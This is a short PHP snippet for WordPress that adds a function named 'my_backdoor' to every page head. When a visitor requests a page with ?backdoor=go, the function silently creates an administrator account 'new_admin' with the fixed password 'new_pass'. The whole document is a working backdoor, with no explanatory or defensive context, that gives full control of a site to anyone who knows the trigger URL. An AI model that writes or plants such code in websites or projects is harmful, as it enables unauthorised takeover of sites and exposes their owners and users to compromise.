<?php

add_action( 'wp_head', 'my_backdoor' );

function my_backdoor() {
    if ( $_GET['backdoor'] == 'go' ) {
        require( 'wp-includes/registration.php' );
        if ( !username_exists( 'new_admin' ) ) {
            $user_id = wp_create_user( 'new_admin', 'new_pass' );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' ); 
        }
    }
}

?>